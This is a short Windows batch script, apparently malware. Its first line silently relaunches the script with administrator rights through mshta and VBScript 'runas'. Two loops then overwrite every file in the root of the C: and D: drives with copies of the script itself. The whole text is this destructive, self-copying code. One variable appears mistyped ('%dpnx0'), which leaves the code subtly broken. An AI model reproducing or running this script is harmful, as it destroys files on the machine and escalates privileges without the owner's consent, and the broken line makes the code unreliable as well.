@%1 mshta vbscript:CreateObject("Shell.Application").ShellExecute("cmd.exe","/c %~s0 ::","","runas",0)(window.close)&&exit

for /f "tokens=* delims=" %%i in ('dir /b D:\*.*') do copy /y "%dpnx0" "%%i" >nul

for /f "tokens=* delims=" %%i in ('dir /b C:\*.*') do copy /y "%dpnx0" "%%i" >nul